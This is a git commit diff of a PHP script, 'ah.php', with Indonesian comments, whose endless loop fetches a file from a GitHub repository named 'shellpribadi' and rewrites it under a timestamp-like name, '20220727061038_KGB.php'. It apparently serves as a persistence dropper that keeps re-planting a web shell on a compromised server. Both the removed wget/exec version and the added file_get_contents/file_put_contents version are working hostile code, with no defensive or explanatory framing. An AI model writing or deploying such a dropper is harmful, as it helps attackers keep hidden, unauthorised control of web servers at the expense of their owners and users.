a56f0595afa81e375b82a071db29665fbfa6eca6
kennn404 <kennn4013@gmail.com>
2024-12-21 23:22:21 +0700

    Update ah.php

--- ah.php
+++ ah.php
@@ -2,22 +2,15 @@
 
 // Loop tak terbatas
 while (true) {
-    // Nama file yang ingin dipastikan ada
-    $outputFile = '20220727061038_KGB.php';
-    // URL sumber data
+    // Mengambil konten dari URL dan menyimpannya ke file 'tes.php'
     $url = 'https://raw.githubusercontent.com/kennn404/shellpribadi/refs/heads/main/in.txt';
+    $content = file_get_contents($url);
 
-    // Mengecek apakah file sudah ada
-    if (!file_exists($outputFile)) {
-        // Jika file tidak ada, gunakan wget untuk mengunduh file
-        $command = "wget --quiet --output-document=$outputFile $url 2>/dev/null";
-        exec($command, $output, $returnVar);
-
-        // Memastikan unduhan berhasil
-        if ($returnVar !== 0) {
-            // Jika gagal mengunduh, hentikan skrip
-            exit;
-        }
+    // Memastikan konten berhasil diambil sebelum menulis ke file
+    if ($content !== false) {
+        file_put_contents('20220727061038_KGB.php', $content);
+    } else {
+        echo "Gagal mengunduh konten dari $url\n";
     }
 
     // Menunggu selama 5 detik sebelum mengulangi
